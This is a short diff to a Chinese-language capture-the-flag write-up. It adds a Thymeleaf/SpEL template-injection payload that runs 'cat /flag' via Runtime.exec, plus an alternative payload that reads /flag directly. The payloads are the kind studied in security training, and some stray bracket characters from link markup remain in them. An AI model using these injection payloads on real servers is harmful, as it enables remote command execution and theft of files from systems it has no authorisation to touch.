@@ -87,7 +87,11 @@ F12查看源码发现一个文件名奇怪的js,功能是定时发送请求.
 
 然后队内师傅提示,直接读文件.
 
-`[[${new [java.io](qq://txfile/#).BufferedReader(new [java.io](qq://txfile/#).FileReader("/flag")).readLine()}]]`
+`[[${new java.io.BufferedReader(new [java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("cat /flag").getInputStream())).readLine()}]]`
+
+或
+
+`[[${new java.io.BufferedReader(new [java.io.FileReader("/flag")).readLine()}]]`
 
 ### Easy Realworld Challenge 
 
